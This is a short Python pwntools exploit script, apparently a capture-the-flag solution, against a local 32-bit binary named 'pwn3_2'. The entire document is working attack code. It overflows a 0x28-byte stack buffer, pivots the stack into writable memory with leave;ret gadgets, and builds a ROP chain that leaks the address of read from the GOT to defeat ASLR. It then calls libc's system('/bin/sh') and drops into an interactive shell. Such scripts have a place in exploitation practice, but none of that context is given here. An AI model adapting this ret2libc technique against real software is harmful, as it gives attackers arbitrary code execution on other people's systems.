from pwn import *
context.log_level = 'debug'

#overflow_length = 0x28

def write(addr,data):
	pay = 'a'*0x28 + p32(addr + 0x28) + p32(code_read)
	cn.send(pay)
	cn.recv()
	pay = data.ljust(0x28,'\xff') + p32(0x0804A000 + 0x400) + p32(code_read)
	cn.send(pay)
	cn.recv()

def writeall(addr,data):
	n = len(data)//0xc
	for i in range(n):
		write(addr +i*0xc,data[i*0xc:(i+1)*0xc])
	i += 1
	write(addr+i*0xc,data[i*0xc:])

cn = process('./pwn3_2')
bin = ELF('./pwn3_2')
libc = ELF('/lib32/libc.so.6')

p3ret = 0x080484e9
code_read = 0x08048444
leave_ret = 0x08048468

pay = ''
pay += p32(bin.symbols['write']) + p32(p3ret) + p32(1) + p32(bin.got['read']) + p32(4)
pay += p32(bin.symbols['main'])

writeall(0x0804A000 + 0x200,pay)

cn.send('a'*0x28 + p32(0x0804A000 + 0x200 -4) + p32(leave_ret))
cn.recv(0x30)
p_read = u32(cn.recv(4))

p_system = p_read - libc.symbols['read'] + libc.symbols['system']
p_binsh = p_read - libc.symbols['read'] + libc.search('/bin/sh').next()
print hex(p_system),hex(p_binsh)

pay = ''
pay += p32(p_system) + 'bbbb' + p32(p_binsh)

write(0x0804A000 + 0x300,pay)
cn.send('a'*0x28 + p32(0x0804A000 + 0x300 -4) + p32(leave_ret))
cn.recv()
cn.interactive()
